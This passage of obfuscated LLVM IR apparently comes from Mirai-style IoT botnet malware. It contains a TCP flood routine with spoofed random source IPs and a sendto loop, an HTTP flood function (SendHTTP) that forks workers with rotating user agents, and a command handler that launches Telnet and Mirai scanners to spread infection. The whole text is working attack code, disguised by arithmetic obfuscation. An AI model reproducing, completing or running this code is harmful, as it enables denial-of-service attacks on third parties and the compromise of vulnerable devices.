  %339 = or i16 -6800, %329
  %340 = and i16 %338, %339
  %341 = or i16 %336, %340
  %342 = or i16 %325, 1024
  store i16 %341, i16* %317, align 4
  br label %417

; <label>:343:                                    ; preds = %309
  %344 = load i8*, i8** %23, align 8
  %345 = call i32 @strcmp(i8* %344, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.542, i32 0, i32 0)) #9
  %346 = icmp ne i32 %345, 0
  br i1 %346, label %361, label %347

; <label>:347:                                    ; preds = %343
  %348 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %349 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %348, i32 0, i32 0
  %350 = bitcast %union.anon* %349 to %struct.anon.0*
  %351 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %350, i32 0, i32 4
  %352 = load i16, i16* %351, align 4
  %353 = xor i16 -257, -1
  %354 = xor i16 %352, %353
  %355 = and i16 %354, %352
  %356 = and i16 %352, -257
  %357 = and i16 %355, 256
  %358 = xor i16 %355, 256
  %359 = or i16 %357, %358
  %360 = or i16 %355, 256
  store i16 %359, i16* %351, align 4
  br label %416

; <label>:361:                                    ; preds = %343
  %362 = load i8*, i8** %23, align 8
  %363 = call i32 @strcmp(i8* %362, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.543, i32 0, i32 0)) #9
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %395, label %365

; <label>:365:                                    ; preds = %361
  %366 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = bitcast %union.anon* %367 to %struct.anon.0*
  %369 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %368, i32 0, i32 4
  %370 = load i16, i16* %369, align 4
  %371 = xor i16 %370, -1
  %372 = xor i16 -4097, -1
  %373 = xor i16 31167, -1
  %374 = or i16 %371, %372
  %375 = or i16 31167, %373
  %376 = xor i16 %374, -1
  %377 = and i16 %376, %375
  %378 = and i16 %370, -4097
  %379 = xor i16 %377, -1
  %380 = xor i16 4096, -1
  %381 = xor i16 16126, -1
  %382 = and i16 %379, 16126
  %383 = and i16 %377, %381
  %384 = and i16 %380, 16126
  %385 = and i16 4096, %381
  %386 = or i16 %382, %383
  %387 = or i16 %384, %385
  %388 = xor i16 %386, %387
  %389 = or i16 %379, %380
  %390 = xor i16 %389, -1
  %391 = or i16 16126, %381
  %392 = and i16 %390, %391
  %393 = or i16 %388, %392
  %394 = or i16 %377, 4096
  store i16 %393, i16* %369, align 4
  br label %415

; <label>:395:                                    ; preds = %361
  %396 = load i8*, i8** %23, align 8
  %397 = call i32 @strcmp(i8* %396, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.544, i32 0, i32 0)) #9
  %398 = icmp ne i32 %397, 0
  br i1 %398, label %413, label %399

; <label>:399:                                    ; preds = %395
  %400 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %401 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %400, i32 0, i32 0
  %402 = bitcast %union.anon* %401 to %struct.anon.0*
  %403 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %402, i32 0, i32 4
  %404 = load i16, i16* %403, align 4
  %405 = xor i16 -2049, -1
  %406 = xor i16 %404, %405
  %407 = and i16 %406, %404
  %408 = and i16 %404, -2049
  %409 = and i16 %407, 2048
  %410 = xor i16 %407, 2048
  %411 = or i16 %409, %410
  %412 = or i16 %407, 2048
  store i16 %411, i16* %403, align 4
  br label %414

; <label>:413:                                    ; preds = %395
  br label %414

; <label>:414:                                    ; preds = %413, %399
  br label %415

; <label>:415:                                    ; preds = %414, %365
  br label %416

; <label>:416:                                    ; preds = %415, %347
  br label %417

; <label>:417:                                    ; preds = %416, %313
  br label %418

; <label>:418:                                    ; preds = %417, %291
  %419 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.545, i32 0, i32 0)) #5
  store i8* %419, i8** %23, align 8
  br label %284

; <label>:420:                                    ; preds = %284
  br label %421

; <label>:421:                                    ; preds = %420, %159
  %422 = call i32 @rand_cmwc()
  %423 = trunc i32 %422 to i16
  %424 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %425 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %424, i32 0, i32 0
  %426 = bitcast %union.anon* %425 to %struct.anon.0*
  %427 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %426, i32 0, i32 5
  store i16 %423, i16* %427, align 2
  %428 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %429 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %428, i32 0, i32 0
  %430 = bitcast %union.anon* %429 to %struct.anon.0*
  %431 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %430, i32 0, i32 6
  store i16 0, i16* %431, align 4
  %432 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %433 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %432, i32 0, i32 0
  %434 = bitcast %union.anon* %433 to %struct.anon.0*
  %435 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %434, i32 0, i32 7
  store i16 0, i16* %435, align 2
  %436 = load i32, i32* %9, align 4
  %437 = icmp eq i32 %436, 0
  br i1 %437, label %438, label %440

; <label>:438:                                    ; preds = %421
  %439 = call i32 @rand_cmwc()
  br label %445

; <label>:440:                                    ; preds = %421
  %441 = load i32, i32* %9, align 4
  %442 = trunc i32 %441 to i16
  %443 = call zeroext i16 @htons(i16 zeroext %442) #10
  %444 = zext i16 %443 to i32
  br label %445

; <label>:445:                                    ; preds = %440, %438
  %446 = phi i32 [ %439, %438 ], [ %444, %440 ]
  %447 = trunc i32 %446 to i16
  %448 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %449 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %448, i32 0, i32 0
  %450 = bitcast %union.anon* %449 to %struct.anon.0*
  %451 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %450, i32 0, i32 1
  store i16 %447, i16* %451, align 2
  %452 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %453 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %454 = call zeroext i16 @tcpcsum(%struct.iphdr* %452, %struct.tcphdr* %453)
  %455 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 0
  %457 = bitcast %union.anon* %456 to %struct.anon.0*
  %458 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %457, i32 0, i32 6
  store i16 %454, i16* %458, align 4
  %459 = bitcast i8* %93 to i16*
  %460 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %461 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %460, i32 0, i32 2
  %462 = load i16, i16* %461, align 2
  %463 = zext i16 %462 to i32
  %464 = call zeroext i16 @csum(i16* %459, i32 %463)
  %465 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %466 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %465, i32 0, i32 7
  store i16 %464, i16* %466, align 2
  %467 = call i64 @time(i64* null) #5
  %468 = load i32, i32* %10, align 4
  %469 = sext i32 %468 to i64
  %470 = sub i64 %467, 3180149479830001826
  %471 = add i64 %470, %469
  %472 = add i64 %471, 3180149479830001826
  %473 = add nsw i64 %467, %469
  %474 = trunc i64 %472 to i32
  store i32 %474, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %475

; <label>:475:                                    ; preds = %529, %528, %445
  br label %476

; <label>:476:                                    ; preds = %475
  %477 = load i32, i32* %17, align 4
  %478 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %479 = call i64 @sendto(i32 %477, i8* %93, i64 %90, i32 0, %struct.sockaddr* %478, i32 16)
  %480 = load i32, i32* %19, align 4
  %481 = call i32 @getRandomIP(i32 %480)
  %482 = call i32 @htonl(i32 %481) #10
  %483 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 8
  store i32 %482, i32* %484, align 4
  %485 = call i32 @rand_cmwc()
  %486 = trunc i32 %485 to i16
  %487 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %488 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %487, i32 0, i32 3
  store i16 %486, i16* %488, align 4
  %489 = call i32 @rand_cmwc()
  %490 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %491 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %490, i32 0, i32 0
  %492 = bitcast %union.anon* %491 to %struct.anon.0*
  %493 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %492, i32 0, i32 2
  store i32 %489, i32* %493, align 4
  %494 = call i32 @rand_cmwc()
  %495 = trunc i32 %494 to i16
  %496 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %497 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %496, i32 0, i32 0
  %498 = bitcast %union.anon* %497 to %struct.anon.0*
  %499 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %498, i32 0, i32 0
  store i16 %495, i16* %499, align 4
  %500 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %501 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %500, i32 0, i32 0
  %502 = bitcast %union.anon* %501 to %struct.anon.0*
  %503 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %502, i32 0, i32 6
  store i16 0, i16* %503, align 4
  %504 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %505 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %506 = call zeroext i16 @tcpcsum(%struct.iphdr* %504, %struct.tcphdr* %505)
  %507 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 0
  %509 = bitcast %union.anon* %508 to %struct.anon.0*
  %510 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %509, i32 0, i32 6
  store i16 %506, i16* %510, align 4
  %511 = bitcast i8* %93 to i16*
  %512 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %513 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %512, i32 0, i32 2
  %514 = load i16, i16* %513, align 2
  %515 = zext i16 %514 to i32
  %516 = call zeroext i16 @csum(i16* %511, i32 %515)
  %517 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %518 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %517, i32 0, i32 7
  store i16 %516, i16* %518, align 2
  %519 = load i32, i32* %25, align 4
  %520 = load i32, i32* %15, align 4
  %521 = icmp eq i32 %519, %520
  br i1 %521, label %522, label %529

; <label>:522:                                    ; preds = %476
  %523 = call i64 @time(i64* null) #5
  %524 = load i32, i32* %24, align 4
  %525 = sext i32 %524 to i64
  %526 = icmp sgt i64 %523, %525
  br i1 %526, label %527, label %528

; <label>:527:                                    ; preds = %522
  br label %534

; <label>:528:                                    ; preds = %522
  store i32 0, i32* %25, align 4
  br label %475

; <label>:529:                                    ; preds = %476
  %530 = load i32, i32* %25, align 4
  %531 = sub i32 0, 1
  %532 = sub i32 %530, %531
  %533 = add i32 %530, 1
  store i32 %532, i32* %25, align 4
  br label %475

; <label>:534:                                    ; preds = %527
  %535 = load i8*, i8** %20, align 8
  call void @llvm.stackrestore(i8* %535)
  br label %536

; <label>:536:                                    ; preds = %534, %57, %51, %44
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #4

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #5
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #10
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #5
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #5
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

; Function Attrs: noinline nounwind uwtable
define void @SendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i64 @time(i64* null) #5
  %20 = load i32, i32* %11, align 4
  %21 = sext i32 %20 to i64
  %22 = sub i64 %19, -4374637483255308941
  %23 = add i64 %22, %21
  %24 = add i64 %23, -4374637483255308941
  %25 = add nsw i64 %19, %21
  %26 = trunc i64 %24 to i32
  store i32 %26, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %27

; <label>:27:                                     ; preds = %70, %6
  %28 = load i32, i32* %14, align 4
  %29 = load i32, i32* %12, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %76

; <label>:31:                                     ; preds = %27
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %33 = load i8*, i8** %7, align 8
  %34 = load i8*, i8** %10, align 8
  %35 = load i8*, i8** %8, align 8
  %36 = call i32 @rand() #5
  %37 = srem i32 %36, 59
  %38 = sext i32 %37 to i64
  %39 = getelementptr inbounds [59 x i8*], [59 x i8*]* @useragents, i64 0, i64 %38
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 (i8*, i8*, ...) @sprintf(i8* %32, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.546, i32 0, i32 0), i8* %33, i8* %34, i8* %35, i8* %40) #5
  %42 = call i32 @fork() #5
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %69

; <label>:44:                                     ; preds = %31
  br label %45

; <label>:45:                                     ; preds = %67, %44
  %46 = load i32, i32* %15, align 4
  %47 = sext i32 %46 to i64
  %48 = call i64 @time(i64* null) #5
  %49 = icmp sgt i64 %47, %48
  br i1 %49, label %50, label %68

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %8, align 8
  %52 = load i16, i16* %9, align 2
  %53 = call i32 @socket_connect(i8* %51, i16 zeroext %52)
  store i32 %53, i32* %13, align 4
  %54 = load i32, i32* %13, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %67

; <label>:56:                                     ; preds = %50
  %57 = load i32, i32* %13, align 4
  %58 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %59 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %60 = call i64 @strlen(i8* %59) #9
  %61 = call i64 @write(i32 %57, i8* %58, i64 %60)
  %62 = load i32, i32* %13, align 4
  %63 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %64 = call i64 @read(i32 %62, i8* %63, i64 1)
  %65 = load i32, i32* %13, align 4
  %66 = call i32 @close(i32 %65)
  br label %67

; <label>:67:                                     ; preds = %56, %50
  br label %45

; <label>:68:                                     ; preds = %45
  call void @exit(i32 0) #12
  unreachable

; <label>:69:                                     ; preds = %31
  br label %70

; <label>:70:                                     ; preds = %69
  %71 = load i32, i32* %14, align 4
  %72 = add i32 %71, 779120229
  %73 = add i32 %72, 1
  %74 = sub i32 %73, 779120229
  %75 = add nsw i32 %71, 1
  store i32 %74, i32* %14, align 4
  br label %27

; <label>:76:                                     ; preds = %27
  ret void
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8*, align 8
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i8*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8*, align 8
  %36 = alloca i32, align 4
  %37 = alloca i64, align 8
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %38 = load i8**, i8*** %4, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 0
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @strcmp(i8* %40, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.547, i32 0, i32 0)) #9
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %44, label %43

; <label>:43:                                     ; preds = %2
  br label %663

; <label>:44:                                     ; preds = %2
  %45 = load i8**, i8*** %4, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 0
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @strcmp(i8* %47, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.548, i32 0, i32 0)) #9
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %159, label %50

; <label>:50:                                     ; preds = %44
  %51 = load i8**, i8*** %4, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 1
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @strcmp(i8* %53, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i32 0, i32 0)) #9
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %122, label %56

; <label>:56:                                     ; preds = %50
  %57 = call i32 @fork() #5
  store i32 %57, i32* %5, align 4
  store i32 0, i32* %6, align 4
  %58 = call i64 @sysconf(i32 84) #5
  %59 = trunc i64 %58 to i32
  store i32 %59, i32* %7, align 4
  store i32 999999, i32* %8, align 4
  %60 = load i32, i32* %7, align 4
  %61 = icmp eq i32 %60, 1
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %56
  store i32 500, i32* %8, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %56
  %64 = load i32, i32* %7, align 4
  %65 = icmp sge i32 %64, 2
  br i1 %65, label %66, label %67

; <label>:66:                                     ; preds = %63
  store i32 1000, i32* %8, align 4
  br label %67

; <label>:67:                                     ; preds = %66, %63
  %68 = load i32, i32* %5, align 4
  %69 = icmp ugt i32 %68, 0
  br i1 %69, label %70, label %72

; <label>:70:                                     ; preds = %67
  %71 = load i32, i32* %5, align 4
  store i32 %71, i32* @scanPid, align 4
  br label %663

; <label>:72:                                     ; preds = %67
  %73 = load i32, i32* %5, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %663

; <label>:76:                                     ; preds = %72
  br label %77

; <label>:77:                                     ; preds = %76
  store i32 0, i32* %6, align 4
  br label %78

; <label>:78:                                     ; preds = %115, %77
  %79 = load i32, i32* %6, align 4
  %80 = load i32, i32* %7, align 4
  %81 = icmp slt i32 %79, %80
  br i1 %81, label %82, label %121

; <label>:82:                                     ; preds = %78
  %83 = call i64 @time(i64* null) #5
  %84 = call i32 @getpid() #5
  %85 = sext i32 %84 to i64
  %86 = xor i64 %83, -1
  %87 = and i64 %85, %86
  %88 = xor i64 %85, -1
  %89 = and i64 %83, %88
  %90 = or i64 %87, %89
  %91 = xor i64 %83, %85
  %92 = call i32 @getppid() #5
  %93 = sext i32 %92 to i64
  %94 = add i64 %90, -3406227198988502308
  %95 = add i64 %94, %93
  %96 = sub i64 %95, -3406227198988502308
  %97 = add nsw i64 %90, %93
  %98 = trunc i64 %96 to i32
  call void @srand(i32 %98) #5
  %99 = call i64 @time(i64* null) #5
  %100 = call i32 @getpid() #5
  %101 = sext i32 %100 to i64
  %102 = xor i64 %99, -1
  %103 = and i64 -5469805258192033783, %102
  %104 = xor i64 -5469805258192033783, -1
  %105 = and i64 %99, %104
  %106 = xor i64 %101, -1
  %107 = and i64 %106, -5469805258192033783
  %108 = and i64 %101, %104
  %109 = or i64 %103, %105
  %110 = or i64 %107, %108
  %111 = xor i64 %109, %110
  %112 = xor i64 %99, %101
  %113 = trunc i64 %111 to i32
  call void @init_rand(i32 %113)
  %114 = load i32, i32* %8, align 4
  call void @TelnetScanner(i32 100, i32 %114)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %116 = load i32, i32* %6, align 4
  %117 = sub i32 %116, -1408552974
  %118 = add i32 %117, 1
  %119 = add i32 %118, -1408552974
  %120 = add nsw i32 %116, 1
  store i32 %119, i32* %6, align 4
  br label %78

; <label>:121:                                    ; preds = %78
  br label %122

; <label>:122:                                    ; preds = %121, %50
  %123 = load i8**, i8*** %4, align 8
  %124 = getelementptr inbounds i8*, i8** %123, i64 1
  %125 = load i8*, i8** %124, align 8
  %126 = call i32 @strcmp(i8* %125, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.550, i32 0, i32 0)) #9
  %127 = icmp ne i32 %126, 0
  br i1 %127, label %135, label %128

; <label>:128:                                    ; preds = %122
  %129 = load i32, i32* @scanPid, align 4
  %130 = icmp eq i32 %129, 0
  br i1 %130, label %131, label %132

; <label>:131:                                    ; preds = %128
  br label %663

; <label>:132:                                    ; preds = %128
  %133 = load i32, i32* @scanPid, align 4
  %134 = call i32 @kill(i32 %133, i32 9) #5
  store i32 0, i32* @scanPid, align 4
  br label %135

; <label>:135:                                    ; preds = %132, %122
  %136 = load i8**, i8*** %4, align 8
  %137 = getelementptr inbounds i8*, i8** %136, i64 1
  %138 = load i8*, i8** %137, align 8
  %139 = call i32 @strcmp(i8* %138, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.551, i32 0, i32 0)) #9
  %140 = icmp ne i32 %139, 0
  br i1 %140, label %158, label %141

; <label>:141:                                    ; preds = %135
  %142 = load i8**, i8*** %4, align 8
  %143 = getelementptr inbounds i8*, i8** %142, i64 1
  %144 = load i8*, i8** %143, align 8
  %145 = call i32 @atoi(i8* %144) #9
  store i32 %145, i32* %9, align 4
  %146 = load i8**, i8*** %4, align 8
  %147 = getelementptr inbounds i8*, i8** %146, i64 2
  %148 = load i8*, i8** %147, align 8
  %149 = call i32 @atoi(i8* %148) #9
  store i32 %149, i32* %10, align 4
  %150 = call i32 @listFork()
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %157, label %152

; <label>:152:                                    ; preds = %141
  %153 = load i32, i32* @mainCommSock, align 4
  %154 = call i32 (i32, i8*, ...) @sockprintf(i32 %153, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.552, i32 0, i32 0))
  %155 = load i32, i32* %10, align 4
  %156 = load i32, i32* %9, align 4
  call void @TelnetScanner(i32 %155, i32 %156)
  call void @_exit(i32 0) #11
  unreachable

; <label>:157:                                    ; preds = %141
  br label %663

; <label>:158:                                    ; preds = %135
  br label %159

; <label>:159:                                    ; preds = %158, %44
  %160 = load i8**, i8*** %4, align 8
  %161 = getelementptr inbounds i8*, i8** %160, i64 0
  %162 = load i8*, i8** %161, align 8
  %163 = call i32 @strcmp(i8* %162, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.553, i32 0, i32 0)) #9
  %164 = icmp ne i32 %163, 0
  br i1 %164, label %270, label %165

; <label>:165:                                    ; preds = %159
  %166 = load i8**, i8*** %4, align 8
  %167 = getelementptr inbounds i8*, i8** %166, i64 1
  %168 = load i8*, i8** %167, align 8
  %169 = call i32 @strcmp(i8* %168, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.549, i32 0, i32 0)) #9
  %170 = icmp ne i32 %169, 0
  br i1 %170, label %233, label %171

; <label>:171:                                    ; preds = %165
  %172 = call i32 @fork() #5
  store i32 %172, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %173 = call i64 @sysconf(i32 84) #5
  %174 = trunc i64 %173 to i32
  store i32 %174, i32* %13, align 4
  store i32 999999, i32* %14, align 4
  %175 = load i32, i32* %13, align 4
  %176 = icmp eq i32 %175, 1
  br i1 %176, label %177, label %178

; <label>:177:                                    ; preds = %171
  store i32 500, i32* %14, align 4
  br label %178

; <label>:178:                                    ; preds = %177, %171
  %179 = load i32, i32* %13, align 4
  %180 = icmp sge i32 %179, 2
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %178
  store i32 1000, i32* %14, align 4
  br label %182

; <label>:182:                                    ; preds = %181, %178
  %183 = load i32, i32* %11, align 4
  %184 = icmp ugt i32 %183, 0
  br i1 %184, label %185, label %187

; <label>:185:                                    ; preds = %182
  %186 = load i32, i32* %11, align 4
  store i32 %186, i32* @scanPid, align 4
  br label %663

; <label>:187:                                    ; preds = %182
  %188 = load i32, i32* %11, align 4
  %189 = icmp eq i32 %188, -1
  br i1 %189, label %190, label %191

; <label>:190:                                    ; preds = %187
  br label %663

; <label>:191:                                    ; preds = %187
  br label %192

; <label>:192:                                    ; preds = %191
  store i32 0, i32* %12, align 4
  br label %193

; <label>:193:                                    ; preds = %225, %192
  %194 = load i32, i32* %12, align 4
  %195 = load i32, i32* %13, align 4
  %196 = icmp slt i32 %194, %195
  br i1 %196, label %197, label %232

; <label>:197:                                    ; preds = %193
  %198 = call i64 @time(i64* null) #5
  %199 = call i32 @getpid() #5
  %200 = sext i32 %199 to i64
  %201 = xor i64 %198, -1
  %202 = and i64 %200, %201
  %203 = xor i64 %200, -1
  %204 = and i64 %198, %203
  %205 = or i64 %202, %204
  %206 = xor i64 %198, %200
  %207 = call i32 @getppid() #5
  %208 = sext i32 %207 to i64
  %209 = sub i64 %205, -1060036179085104279
  %210 = add i64 %209, %208
  %211 = add i64 %210, -1060036179085104279
  %212 = add nsw i64 %205, %208
  %213 = trunc i64 %211 to i32
  call void @srand(i32 %213) #5
  %214 = call i64 @time(i64* null) #5
  %215 = call i32 @getpid() #5
  %216 = sext i32 %215 to i64
  %217 = xor i64 %214, -1
  %218 = and i64 %216, %217
  %219 = xor i64 %216, -1
  %220 = and i64 %214, %219
  %221 = or i64 %218, %220
  %222 = xor i64 %214, %216
  %223 = trunc i64 %221 to i32
  call void @init_rand(i32 %223)
  %224 = load i32, i32* %14, align 4
  call void @MiraiScanner(i32 100, i32 %224)
  call void @_exit(i32 0) #11
  unreachable
                                                  ; No predecessors!
  %226 = load i32, i32* %12, align 4
  %227 = sub i32 0, %226
  %228 = sub i32 0, 1
  %229 = add i32 %227, %228
  %230 = sub i32 0, %229
